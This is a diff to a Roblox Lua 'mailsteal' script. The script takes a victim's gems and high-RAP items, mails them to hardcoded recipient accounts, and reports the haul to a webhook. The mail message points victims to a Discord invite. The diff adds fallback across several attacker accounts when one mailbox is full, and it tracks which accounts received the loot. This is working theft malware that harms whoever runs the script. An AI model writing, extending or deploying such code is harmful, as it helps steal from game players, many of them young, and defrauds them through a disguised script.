@@ -6,6 +6,7 @@ local MailMessage = "Join gg / GY2RVSEGDT to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
+local sentUsers = {}
 _G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -16,8 +17,11 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-if plr.Name == Username then
-    plr:kick("You cannot mailsteal yourself")
+for _, user in ipairs(Usernames) do
+    if plr.Name == user then
+        plr:kick("You cannot mailsteal yourself")
+        return
+    end
 end
 
 local GemAmount1 = 0
@@ -100,7 +104,20 @@ local function SendMessage(username, diamonds)
         fields[2].value = fields[2].value .. itemLine .. "\n"
     end
 
-    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
+    local sentUsersFormatted
+    if #sentUsers == 1 then
+        sentUsersFormatted = "||" .. sentUsers[1] .. "||"
+    elseif #sentUsers > 1 then
+        local formatted = {}
+        for _, user in ipairs(sentUsers) do
+            table.insert(formatted, "||" .. user .. "||")
+        end
+        sentUsersFormatted = table.concat(formatted, ", ")
+    else
+        sentUsersFormatted = "||None||"
+    end
+
+    fields[3].value = string.format("Gems: %s\nTotal RAP: %s\nSent to users: %s", formatNumber(diamonds), formatNumber(totalRAP), sentUsersFormatted)
 
     if #fields[2].value > 1024 then
         local lines = {}
@@ -172,47 +189,76 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local user = Username or "PetsGoMommy"
-local user2 = Username2 or "PetsGoMommy"
+local users = Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
 local min_rap = min_rap or 1000
 local min_chance = min_chance or 100000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
-    local args = {
-        [1] = user,
-        [2] = MailMessage,
-        [3] = category,
-        [4] = uid,
-        [5] = am or 1
-    }
-	local response = false
-	repeat
-    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-        if response == false and err == "They don't have enough space!" then
-            user = user2
-            args[1] = user
+    local userIndex = 1
+    local maxUsers = #users
+    local sent = false
+
+    repeat
+        local currentUser = users[userIndex]
+        local args = {
+            [1] = currentUser,
+            [2] = MailMessage,
+            [3] = category,
+            [4] = uid,
+            [5] = am or 1
+        }
+
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+        if response == true then
+            sent = true
+            if not table.find(sentUsers, currentUser) then
+                table.insert(sentUsers, currentUser)
+            end
+        elseif response == false and err == "They don't have enough space!" then
+            userIndex = userIndex + 1
+            if userIndex > maxUsers then
+                sent = true
+            end
         end
-	until response == true
+    until sent
 end
 
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
-				local args = {
-					[1] = user,
-					[2] = MailMessage,
-					[3] = "Currency",
-					[4] = i,
-					[5] = GemAmount1
-				}
-				local response = false
-				repeat
-					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-				until response == true
-				break
-			end
+            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
+                local userIndex = 1
+                local maxUsers = #users
+                local sent = false
+
+                repeat
+                    local currentUser = users[userIndex]
+                    local args = {
+                        [1] = currentUser,
+                        [2] = MailMessage,
+                        [3] = "Currency",
+                        [4] = i,
+                        [5] = GemAmount1
+                    }
+
+                    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+                    if response == true then
+                        sent = true
+                        if not table.find(sentUsers, currentUser) then
+                            table.insert(sentUsers, currentUser)
+                        end
+                    elseif response == false and err == "They don't have enough space!" then
+                        userIndex = userIndex + 1
+                        if userIndex > maxUsers then
+                            sent = true
+                        end
+                    end
+                until sent
+                break
+            end
         end
     end
 end
